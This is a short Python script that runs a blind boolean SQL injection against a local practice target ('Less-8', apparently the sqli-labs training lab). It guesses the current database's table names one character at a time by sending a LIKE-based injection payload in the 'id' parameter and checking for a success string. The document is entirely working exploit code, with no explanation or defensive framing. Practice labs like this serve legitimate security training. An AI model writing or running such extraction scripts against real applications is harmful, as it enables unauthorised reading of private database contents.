import requests
url = 'http://localhost:8989/Less-8'
name = ''
s = '123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ,'
for i in range(0, 20):
    for c in s:
        x = name + c
        x += '%'
        payload = {'id':f"1' and (select group_concat(table_name) from information_schema.tables where table_schema=database()) like '{x}'#"}
        r = requests.get(url, params=payload)
        if 'You are in' in r.text:
            name += c
            break
print(name)